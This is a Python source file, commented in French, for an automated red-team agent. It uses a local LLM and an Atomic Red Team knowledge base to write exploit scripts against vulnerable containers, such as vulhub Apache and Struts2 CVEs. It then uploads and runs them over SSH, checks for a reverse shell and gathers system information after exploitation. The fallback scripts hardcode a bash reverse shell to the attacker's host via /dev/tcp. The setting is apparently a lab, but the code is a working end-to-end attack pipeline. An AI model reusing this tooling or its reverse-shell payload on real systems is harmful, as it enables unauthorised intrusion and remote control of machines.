# Enhanced Red Team Agent - Corrections Techniques
# Résolution des problèmes de parsing + prompts non-directifs

import os
import json
import subprocess
import sys
import time
import base64
import re
from typing import Dict, List, Any, Optional
from datetime import datetime
from pathlib import Path

# Import du Remote Execution Manager
try:
    from remote_execution_manager import (
        SSHDockerManager, RemoteExploitExecutor,
        SSHConfig, get_ssh_config_interactive,
        select_target_container_interactive
    )
except ImportError:
    print("Remote Execution Manager non trouvé. Assurez-vous qu'il est disponible.")
    sys.exit(1)

# Imports LangChain et Pydantic
from pydantic import BaseModel, Field, validator
from langchain.llms import Ollama
from langchain.embeddings import OllamaEmbeddings
from langchain.vectorstores import Chroma
from langchain.prompts import PromptTemplate
from langchain.chains import LLMChain
from langchain.output_parsers import PydanticOutputParser

print("Enhanced Red Team Agent - Version Corrigée")

# ==================== MODÈLES PYDANTIC CORRIGÉS ====================

class RemoteExploitExecution(BaseModel):
    """Résultats d'exécution d'exploit sur container distant"""
    
    script_uploaded: bool = Field(description="Script d'exploit uploadé avec succès", default=False)
    script_path: str = Field(description="Chemin du script sur le container cible", default="")
    execution_successful: bool = Field(description="Exécution du script réussie", default=False)
    execution_output: str = Field(description="Sortie de l'exécution du script", default="")
    execution_errors: str = Field(description="Erreurs d'exécution", default="")
    reverse_shell_established: bool = Field(description="Reverse shell établi avec succès", default=False)
    reverse_shell_details: Dict[str, Any] = Field(description="Détails de la connexion reverse shell", default_factory=dict)
    compromise_evidence: List[str] = Field(description="Preuves de compromission collectées", default_factory=list)

class EnhancedExploitScript(BaseModel):
    """Script d'exploitation enhanced adapté à l'environnement réel"""
    
    script_name: str = Field(description="Nom du fichier de script", default="exploit.sh")
    script_language: str = Field(description="Langage du script", default="bash")
    script_content: str = Field(description="Code source complet adapté à l'environnement")
    target_payload: str = Field(description="Payload principal personnalisé", default="whoami")
    environment_adaptations: List[str] = Field(description="Adaptations spécifiques à l'environnement détecté", default_factory=list)
    reverse_shell_config: Dict[str, Any] = Field(description="Configuration reverse shell", default_factory=dict)
    dependencies: List[str] = Field(description="Dépendances requises", default_factory=list)
    persistence_mechanisms: List[str] = Field(description="Mécanismes de persistance inclus", default_factory=list)
    
    @validator('script_content')
    def validate_script_content(cls, v):
        if len(v.strip()) < 20:
            raise ValueError("Le script doit être substantiel")
        return v

class EnhancedExploitationReport(BaseModel):
    """Rapport d'exploitation enhanced avec validation réelle"""
    
    exploitation_strategy: str = Field(description="Stratégie d'exploitation", default="Custom strategy")
    environment_analysis: Dict[str, Any] = Field(description="Analyse de l'environnement cible", default_factory=dict)
    generated_exploit: EnhancedExploitScript = Field(description="Script d'exploitation généré")
    remote_execution: RemoteExploitExecution = Field(description="Résultats de l'exécution distante")
    real_world_impact: Dict[str, Any] = Field(description="Impact réel de l'exploitation", default_factory=dict)
    post_exploitation_actions: List[str] = Field(description="Actions post-exploitation réalisées", default_factory=list)
    success_level: str = Field(description="Niveau de succès", default="PARTIAL_REMOTE")
    
    @validator('success_level')
    def validate_success_level(cls, v):
        allowed = ["FULL_REMOTE", "PARTIAL_REMOTE", "FAILED_REMOTE"]
        if v not in allowed:
            return "PARTIAL_REMOTE"
        return v

# ==================== ENHANCED RED TEAM AGENT ====================

class EnhancedRedTeamAgent:
    """Agent Red Team enhanced avec résolution des problèmes techniques"""
    
    def __init__(self, model_name: str = "llama2:7b", enhanced_db_path: str = "./enhanced_vple_chroma_db"):
        print("Initialisation Enhanced Red Team Agent...")
        
        # Composants LLM
        self.llm = Ollama(model=model_name, temperature=0.3)
        self.embeddings = OllamaEmbeddings(model=model_name)
        
        # Base de données ATOMIC RED TEAM
        try:
            self.vectorstore = Chroma(
                persist_directory=enhanced_db_path,
                embedding_function=self.embeddings
            )
            self.retriever = self.vectorstore.as_retriever(search_kwargs={"k": 5})
            print(f"Base ATOMIC RED TEAM connectée: {enhanced_db_path}")
        except Exception as e:
            print(f"Erreur base ATOMIC: {e}")
            self.vectorstore = None
            self.retriever = None
        
        # Composants d'exécution distante
        self.ssh_manager = None
        self.exploit_executor = None
        self.target_container = None
        self.host_ip = None
        
        # Parsers Pydantic
        self.script_parser = PydanticOutputParser(pydantic_object=EnhancedExploitScript)
        self.report_parser = PydanticOutputParser(pydantic_object=EnhancedExploitationReport)
        
        # Configuration des prompts
        self._setup_prompts()
        
        print("Enhanced Red Team Agent initialisé")
    
    def setup_remote_connection(self, ssh_config: SSHConfig = None) -> bool:
        """Configure la connexion distante pour l'exploitation"""
        print("Configuration connexion distante Red Team...")
        
        if ssh_config is None:
            ssh_config = get_ssh_config_interactive()
        
        self.ssh_manager = SSHDockerManager(ssh_config)
        
        if not self.ssh_manager.connect():
            print("Échec connexion SSH")
            return False
        
        self.exploit_executor = RemoteExploitExecutor(self.ssh_manager)
        self.host_ip = ssh_config.host
        
        print("Connexion distante Red Team établie")
        return True
    
    def load_target_from_analysis(self, analysis_report_path: str) -> Dict[str, Any]:
        """Charge les informations de la cible depuis le rapport Enhanced Analyzer"""
        print("Chargement du rapport d'analyse enhanced...")
        
        try:
            with open(analysis_report_path, 'r') as f:
                analysis_data = json.load(f)
            
            metadata = analysis_data.get('metadata', {})
            enhanced_info = analysis_data.get('enhanced_vulhub_info', {})
            
            target_info = {
                "container_id": metadata.get('target_container'),
                "vulhub_id": metadata.get('vulhub_id'),
                "ports_real": enhanced_info.get('real_vs_documented_ports', {}).get('real', []),
                "attack_type": enhanced_info.get('attack_type', 'Unknown'),
                "service": enhanced_info.get('target_service', 'Unknown'),
                "cve": enhanced_info.get('cve_id'),
                "remote_recon": enhanced_info.get('remote_recon', {}),
                "confidence_score": analysis_data.get('enhanced_analysis_report', {}).get('confidence_score', 0.5)
            }
            
            if target_info["container_id"]:
                self.target_container = target_info["container_id"]
                self.exploit_executor.set_target_container(self.target_container)
                print(f"Container cible: {self.target_container[:12]}")
            else:
                print("Container cible non défini dans le rapport")
            
            print(f"Type d'attaque: {target_info['attack_type']}")
            print(f"Service: {target_info['service']}")
            print(f"Ports réels: {target_info['ports_real']}")
            
            return target_info
            
        except Exception as e:
            print(f"Erreur chargement rapport: {e}")
            return {}
    
    def _setup_prompts(self):
        """Configuration des prompts non-directifs"""
        
        # Prompt de stratégie - simple et non-directif
        strategy_template = """Tu es un expert Red Team avec accès à une base de connaissances ATOMIC Red Team contenant des techniques d'attaque MITRE ATT&CK.

ANALYSE DE LA CIBLE:
{analysis_report}

TECHNIQUES ATOMIC RED TEAM DISPONIBLES:
{atomic_techniques}

ENVIRONNEMENT:
- Container ID: {target_container}
- Ports ouverts: {real_ports}
- Services détectés: {web_services}
- OS: {target_os}
- Host IP: {host_ip}

Développe une stratégie d'exploitation basée sur les techniques ATOMIC Red Team et l'analyse de la cible."""

        self.strategy_prompt = PromptTemplate(
            template=strategy_template,
            input_variables=["analysis_report", "atomic_techniques", "target_container", "real_ports", "web_services", "target_os", "host_ip"]
        )
        
        # Prompt de script - simple demande de JSON
        script_template = """Génère un script d'exploitation basé sur cette stratégie et les techniques ATOMIC Red Team.

STRATÉGIE:
{exploitation_strategy}

ENVIRONNEMENT CIBLE:
{target_environment}

HOST IP: {host_ip}
LISTENER PORT: {listener_port}

{format_instructions}

Réponds uniquement avec du JSON valide."""

        self.script_prompt = PromptTemplate(
            template=script_template,
            input_variables=["exploitation_strategy", "target_environment", "host_ip", "listener_port"],
            partial_variables={"format_instructions": self.script_parser.get_format_instructions()}
        )
        
        # Chaînes LangChain
        self.strategy_chain = LLMChain(llm=self.llm, prompt=self.strategy_prompt)
        self.script_chain = LLMChain(llm=self.llm, prompt=self.script_prompt)
    
    def analyze_target_environment(self, target_info: Dict[str, Any]) -> str:
        """Analyse l'environnement cible et consulte ATOMIC RED TEAM"""
        print("Analyse de l'environnement cible et consultation ATOMIC...")
        
        attack_type = target_info.get('attack_type', 'Unknown')
        real_ports = target_info.get('ports_real', [])
        service = target_info.get('service', 'Unknown')
        cve = target_info.get('cve', 'Unknown')
        
        # Consultation ATOMIC RED TEAM
        atomic_techniques = ""
        if self.retriever:
            try:
                search_queries = [
                    f"{service} exploitation",
                    f"{attack_type}",
                    f"{cve}",
                    "container exploitation",
                    "reverse shell"
                ]
                
                all_docs = []
                for query in search_queries:
                    docs = self.retriever.get_relevant_documents(query)
                    all_docs.extend(docs[:2])
                
                if all_docs:
                    atomic_techniques = "\n".join([doc.page_content[:400] for doc in all_docs[:5]])
                    print(f"{len(all_docs)} techniques ATOMIC trouvées")
                else:
                    atomic_techniques = "Aucune technique spécifique trouvée"
            except Exception as e:
                print(f"Erreur consultation ATOMIC: {e}")
                atomic_techniques = "Erreur accès base ATOMIC"
        
        # Préparation des données d'environnement
        web_services = []
        target_os = "Linux Container"
        
        remote_recon = target_info.get('remote_recon', {})
        if remote_recon.get('web_services'):
            web_discoveries = remote_recon['web_services'].get('web_discoveries', {})
            web_services = [f"Port {port}" for port, data in web_discoveries.items() 
                          if data.get('accessible')]
        
        # Génération de la stratégie
        try:
            strategy = self.strategy_chain.run(
                analysis_report=json.dumps(target_info, indent=2),
                atomic_techniques=atomic_techniques,
                target_container=self.target_container[:12] if self.target_container else "Unknown",
                real_ports=str(real_ports),
                web_services=str(web_services),
                target_os=target_os,
                host_ip=self.host_ip
            )
            
            print("Stratégie d'exploitation générée")
            return strategy
            
        except Exception as e:
            print(f"Erreur génération stratégie: {e}")
            return f"Exploitation {service} ({attack_type}) avec reverse shell vers {self.host_ip}"
    
    def generate_enhanced_exploit(self, strategy: str, target_info: Dict[str, Any]) -> EnhancedExploitScript:
        """Génère un exploit enhanced avec parsing robuste"""
        print("Génération d'exploit enhanced pour container...")
        
        # Configuration du reverse shell
        listener_result = self.exploit_executor.setup_reverse_shell_listener()
        
        if listener_result.get('success'):
            listener_port = listener_result['port']
            print(f"Listener configuré sur port {listener_port}")
        else:
            listener_port = 4444
            print(f"Listener par défaut port {listener_port}")
        
        max_attempts = 3
        for attempt in range(max_attempts):
            try:
                target_environment = {
                    "container_id": self.target_container,
                    "real_ports": target_info.get('ports_real', []),
                    "attack_type": target_info.get('attack_type'),
                    "service": target_info.get('service'),
                    "cve": target_info.get('cve'),
                    "os": "Linux Container"
                }
                
                # Génération avec le LLM
                raw_script = self.script_chain.run(
                    exploitation_strategy=strategy,
                    target_environment=json.dumps(target_environment, indent=2),
                    host_ip=self.host_ip,
                    listener_port=listener_port
                )
                
                print(f"Tentative {attempt + 1} - Longueur output: {len(raw_script)}")
                
                # Parser JSON robuste
                enhanced_script = self._robust_json_parse(raw_script, target_info, listener_port)
                
                if enhanced_script:
                    enhanced_script.reverse_shell_config = {
                        "host_ip": self.host_ip,
                        "port": listener_port,
                        "listener_pid": listener_result.get('pid'),
                        "log_file": listener_result.get('log_file')
                    }
                    
                    print(f"Exploit enhanced généré: {enhanced_script.script_name}")
                    return enhanced_script
                
            except Exception as e:
                print(f"Tentative {attempt + 1} échouée: {e}")
                if attempt == max_attempts - 1:
                    return self._create_fallback_script(target_info, listener_port)
                time.sleep(1)
    
    def _robust_json_parse(self, raw_output: str, target_info: Dict[str, Any], listener_port: int) -> Optional[EnhancedExploitScript]:
        """Parser JSON robuste avec multiples stratégies"""
        try:
            # Stratégie 1: JSON direct
            cleaned = raw_output.strip()
            if cleaned.startswith('{') and cleaned.endswith('}'):
                try:
                    data = json.loads(cleaned)
                    return EnhancedExploitScript(**data)
                except:
                    pass
            
            # Stratégie 2: Extraction depuis blocs markdown
            patterns = [
                r'```json\s*(\{.*?\})\s*```',
                r'```\s*(\{.*?\})\s*```',
                r'(\{[^{}]*"script_content"[^{}]*\})'
            ]
            
            for pattern in patterns:
                match = re.search(pattern, raw_output, re.DOTALL)
                if match:
                    try:
                        data = json.loads(match.group(1))
                        return EnhancedExploitScript(**data)
                    except:
                        continue
            
            # Stratégie 3: Parsing manuel des champs
            return self._manual_field_extraction(raw_output, target_info, listener_port)
            
        except Exception as e:
            print(f"Erreur parsing robuste: {e}")
            return None
    
    def _manual_field_extraction(self, output: str, target_info: Dict[str, Any], listener_port: int) -> Optional[EnhancedExploitScript]:
        """Extraction manuelle des champs si JSON échoue"""
        try:
            # Extraction des champs principaux avec regex
            script_name = "exploit.sh"
            script_content = ""
            target_payload = f"bash -i >& /dev/tcp/{self.host_ip}/{listener_port} 0>&1"
            
            # Recherche du nom du script
            name_match = re.search(r'"script_name":\s*"([^"]+)"', output)
            if name_match:
                script_name = name_match.group(1)
            
            # Recherche du contenu du script
            # Chercher les blocs de code bash
            bash_patterns = [
                r'#!/bin/bash(.*?)(?=\n[^#\n]|\Z)',
                r'"script_content":\s*"([^"]+)"',
                r'```bash\n(.*?)\n```'
            ]
            
            for pattern in bash_patterns:
                match = re.search(pattern, output, re.DOTALL)
                if match:
                    content = match.group(1).strip()
                    if len(content) > 20:
                        script_content = f"#!/bin/bash\n{content}"
                        break
            
            # Si pas de contenu trouvé, générer un script minimal
            if not script_content:
                script_content = self._generate_minimal_script(target_info, listener_port)
            
            return EnhancedExploitScript(
                script_name=script_name,
                script_language="bash",
                script_content=script_content,
                target_payload=target_payload,
                environment_adaptations=[f"Adapté pour {target_info.get('service', 'Unknown')}"],
                reverse_shell_config={"host_ip": self.host_ip, "port": listener_port},
                dependencies=["bash"],
                persistence_mechanisms=[]
            )
            
        except Exception as e:
            print(f"Erreur extraction manuelle: {e}")
            return None
    
    def _generate_minimal_script(self, target_info: Dict[str, Any], listener_port: int) -> str:
        """Génère un script minimal basé sur l'analyse"""
        service = target_info.get('service', 'Unknown')
        attack_type = target_info.get('attack_type', 'Unknown')
        ports = target_info.get('ports_real', [])
        
        return f"""#!/bin/bash
# Exploit généré pour {service}
# Type d'attaque: {attack_type}

echo "Démarrage exploitation {service}..."
echo "Ports détectés: {ports}"
echo "Utilisateur: $(whoami)"
echo "ID: $(id)"

# Test connectivité
ping -c 1 {self.host_ip} && echo "Host accessible"

# Tentative reverse shell
bash -c 'bash -i >& /dev/tcp/{self.host_ip}/{listener_port} 0>&1' &

echo "Exploitation terminée"
"""
    
    def _create_fallback_script(self, target_info: Dict, listener_port: int) -> EnhancedExploitScript:
        """Crée un script de fallback fonctionnel"""
        print("Création d'un exploit de fallback...")
        
        service = target_info.get('service', 'Unknown Service')
        attack_type = target_info.get('attack_type', 'Web Exploitation')
        
        fallback_content = self._generate_minimal_script(target_info, listener_port)
        
        return EnhancedExploitScript(
            script_name=f"fallback_exploit_{service.lower().replace(' ', '_')}.sh",
            script_language="bash",
            script_content=fallback_content,
            target_payload=f"bash -i >& /dev/tcp/{self.host_ip}/{listener_port} 0>&1",
            environment_adaptations=[f"Script de fallback pour {service}"],
            reverse_shell_config={"host_ip": self.host_ip, "port": listener_port},
            dependencies=["bash"],
            persistence_mechanisms=[]
        )
    
    def execute_enhanced_exploit(self, enhanced_script: EnhancedExploitScript) -> RemoteExploitExecution:
        """Exécute l'exploit enhanced sur le container distant"""
        print("Exécution de l'exploit enhanced sur container distant...")
        
        if not self.exploit_executor or not self.target_container:
            return RemoteExploitExecution(
                script_uploaded=False,
                script_path="",
                execution_successful=False,
                execution_output="Container cible non configuré"
            )
        
        # Upload et exécution du script
        execution_result = self.exploit_executor.upload_and_execute_script(
            enhanced_script.script_content,
            enhanced_script.script_name,
            enhanced_script.script_language
        )
        
        # Vérification du reverse shell
        reverse_shell_success = False
        reverse_shell_details = {}
        
        if enhanced_script.reverse_shell_config:
            listen_port = enhanced_script.reverse_shell_config.get('port')
            if listen_port:
                print(f"Vérification reverse shell port {listen_port}...")
                time.sleep(5)
                
                shell_check = self.exploit_executor.check_reverse_shell_connection(listen_port)
                reverse_shell_success = shell_check.get('has_connection', False)
                reverse_shell_details = shell_check
                
                if reverse_shell_success:
                    print("Reverse shell établi avec succès!")
                else:
                    print("Reverse shell non détecté")
        
        # Collection de preuves
        evidence = []
        if execution_result.get('success'):
            evidence.append("Script d'exploitation exécuté avec succès")
            
            output = execution_result.get('execution_output', '')
            if 'root' in output or 'uid=0' in output:
                evidence.append("Privilèges root détectés")
            if 'bash' in output and 'tcp' in output:
                evidence.append("Tentative de reverse shell détectée")
            if '/etc/passwd' in output:
                evidence.append("Accès aux fichiers système sensibles")
        
        if reverse_shell_success:
            evidence.append("Reverse shell établi vers machine hôte")
        
        return RemoteExploitExecution(
            script_uploaded=execution_result.get('success', False),
            script_path=execution_result.get('script_path', ''),
            execution_successful=execution_result.get('success', False),
            execution_output=execution_result.get('execution_output', ''),
            execution_errors=execution_result.get('execution_errors', ''),
            reverse_shell_established=reverse_shell_success,
            reverse_shell_details=reverse_shell_details,
            compromise_evidence=evidence
        )
    
    def perform_post_exploitation(self) -> List[str]:
        """Effectue des actions post-exploitation sur le container"""
        print("Actions post-exploitation...")
        
        if not self.exploit_executor or not self.target_container:
            return ["Container non accessible pour post-exploitation"]
        
        post_actions = []
        
        # Commandes post-exploitation simples (échappement corrigé)
        commands = [
            ("System Info", "uname -a && cat /etc/os-release"),
            ("User Info", "whoami && id && groups"),
            ("Network Config", "ip addr show 2>/dev/null || ifconfig"),
            ("Process List", "ps aux | head -20"),
            ("Mount Points", "mount | head -10"),
            ("Environment", "env | head -10")
        ]
        
        for action_name, command in commands:
            result = self.exploit_executor.execute_direct_command(
                command, f"Post-exploitation: {action_name}"
            )
            
            if result.get('success'):
                post_actions.append(f"{action_name}: Collecté")
            else:
                post_actions.append(f"{action_name}: Échec")
        
        print(f"{len(post_actions)} actions post-exploitation effectuées")
        return post_actions
    
    def generate_enhanced_report(self, strategy: str, enhanced_script: EnhancedExploitScript, 
                                execution_result: RemoteExploitExecution, target_info: Dict[str, Any]) -> EnhancedExploitationReport:
        """Génère le rapport d'exploitation enhanced"""
        print("Génération du rapport enhanced...")
        
        post_actions = self.perform_post_exploitation()
        
        # Détermination du niveau de succès
        if execution_result.reverse_shell_established:
            success_level = "FULL_REMOTE"
        elif execution_result.execution_successful:
            success_level = "PARTIAL_REMOTE"
        else:
            success_level = "FAILED_REMOTE"
        
        real_impact = {
            "container_compromised": execution_result.execution_successful,
            "reverse_shell_obtained": execution_result.reverse_shell_established,
            "evidence_collected": len(execution_result.compromise_evidence),
            "post_exploitation_actions": len(post_actions),
            "real_world_validation": True
        }
        
        env_analysis = {
            "target_container": self.target_container[:12] if self.target_container else "Unknown",
            "real_ports_exploited": target_info.get('ports_real', []),
            "attack_type_confirmed": target_info.get('attack_type'),
            "service_compromised": target_info.get('service'),
            "host_ip_targeted": self.host_ip
        }
        
        return EnhancedExploitationReport(
            exploitation_strategy=strategy[:500],
            environment_analysis=env_analysis,
            generated_exploit=enhanced_script,
            remote_execution=execution_result,
            real_world_impact=real_impact,
            post_exploitation_actions=post_actions,
            success_level=success_level
        )
    
    def run_enhanced_exploitation(self, analysis_report_path: str) -> Dict[str, Any]:
        """Méthode principale d'exploitation enhanced avec exécution distante"""
        print("EXPLOITATION ENHANCED AVEC EXÉCUTION DISTANTE")
        
        start_time = time.time()
        
        try:
            # Configuration connexion distante
            print("[1/6] Configuration connexion distante...")
            if not self.setup_remote_connection():
                return {"status": "ERROR", "error": "Connexion distante impossible"}
            
            # Chargement du rapport d'analyse
            print("[2/6] Chargement rapport d'analyse enhanced...")
            target_info = self.load_target_from_analysis(analysis_report_path)
            
            if not target_info or not self.target_container:
                return {"status": "ERROR", "error": "Informations cible invalides"}
            
            # Analyse de l'environnement et stratégie
            print("[3/6] Analyse environnement et stratégie...")
            strategy = self.analyze_target_environment(target_info)
            
            # Génération d'exploit enhanced
            print("[4/6] Génération exploit enhanced...")
            enhanced_script = self.generate_enhanced_exploit(strategy, target_info)
            
            # Exécution distante de l'exploit
            print("[5/6] Exécution distante de l'exploit...")
            execution_result = self.execute_enhanced_exploit(enhanced_script)
            
            # Génération du rapport final
            print("[6/6] Génération rapport final...")
            enhanced_report = self.generate_enhanced_report(
                strategy, enhanced_script, execution_result, target_info
            )
            
            # Nettoyage
            if self.exploit_executor:
                self.exploit_executor.cleanup_exploits()
            
            total_time = time.time() - start_time
            
            complete_result = {
                "metadata": {
                    "agent": "EnhancedRedTeamAgent",
                    "version": "Corrected",
                    "timestamp": datetime.now().isoformat(),
                    "execution_time": total_time,
                    "target_container": self.target_container,
                    "host_ip": self.host_ip
                },
                "enhanced_exploitation_report": enhanced_report.dict(),
                "remote_validation": True,
                "status": "SUCCESS"
            }
            
            # Sauvegarde du rapport
            report_file = "enhanced_exploitation_report_corrected.json"
            with open(report_file, 'w') as f:
                json.dump(complete_result, f, indent=2)
            
            print("EXPLOITATION ENHANCED TERMINÉE")
            print(f"Temps total: {total_time:.2f} secondes")
            print(f"Niveau de succès: {enhanced_report.success_level}")
            print(f"Reverse shell: {execution_result.reverse_shell_established}")
            print(f"Preuves: {len(execution_result.compromise_evidence)}")
            print(f"Rapport sauvegardé: {report_file}")
            
            return complete_result
            
        except Exception as e:
            print(f"ERREUR EXPLOITATION ENHANCED: {e}")
            return {
                "metadata": {
                    "agent": "EnhancedRedTeamAgent",
                    "timestamp": datetime.now().isoformat()
                },
                "status": "ERROR",
                "error": str(e)
            }
        
        finally:
            if self.ssh_manager:
                self.ssh_manager.disconnect()

print("EnhancedRedTeamAgent class defined")

# ==================== DEMO INTERFACE ====================

def demo_enhanced_redteam_corrected():
    """Démonstration de l'Enhanced Red Team corrigé"""
    print("DÉMONSTRATION - ENHANCED RED TEAM CORRIGÉ")
    print("="*60)
    
    # Chargement configuration
    try:
        with open("vple_config.json", "r") as f:
            config = json.load(f)
        model_name = config.get("confirmed_model", "llama2:7b")
        enhanced_db_path = config.get("enhanced_rag_setup", {}).get("vector_db", "./enhanced_vple_chroma_db")
    except:
        model_name = "llama2:7b"
        enhanced_db_path = "./enhanced_vple_chroma_db"
    
    red_team = EnhancedRedTeamAgent(
        model_name=model_name,
        enhanced_db_path=enhanced_db_path
    )
    
    # Recherche du rapport d'analyse
    analysis_files = [
        "enhanced_analysis_apache-cxf_CVE-2024-28752.json",
        "enhanced_analysis_apache_CVE-2021-41773.json",
        "enhanced_analysis_struts2_s2-001.json",
        "analysis_report.json"
    ]
    
    analysis_file = None
    for file_path in analysis_files:
        if os.path.exists(file_path):
            analysis_file = file_path
            break
    
    if not analysis_file:
        print("Aucun rapport d'analyse trouvé")
        print("Fichiers recherchés:", analysis_files)
        return
    
    print(f"Utilisation du rapport: {analysis_file}")
    
    # Exécution de l'exploitation enhanced
    result = red_team.run_enhanced_exploitation(analysis_file)
    
    # Affichage des résultats
    if result['status'] == 'SUCCESS':
        exploitation_report = result['enhanced_exploitation_report']
        print("EXPLOITATION ENHANCED RÉUSSIE!")
        print(f"Succès: {exploitation_report['success_level']}")
        print(f"Reverse shell: {exploitation_report['remote_execution']['reverse_shell_established']}")
        print(f"Preuves: {len(exploitation_report['remote_execution']['compromise_evidence'])}")
        print(f"Post-exploitation: {len(exploitation_report['post_exploitation_actions'])}")
        
        if exploitation_report['remote_execution']['compromise_evidence']:
            print("PREUVES DE COMPROMISSION:")
            for evidence in exploitation_report['remote_execution']['compromise_evidence']:
                print(f"- {evidence}")
        
    else:
        print(f"Exploitation échouée: {result.get('error', 'Erreur inconnue')}")
    
    print("DÉMONSTRATION TERMINÉE")

if __name__ == "__main__":
    demo_enhanced_redteam_corrected()

print("ENHANCED RED TEAM AGENT CORRIGÉ READY!")
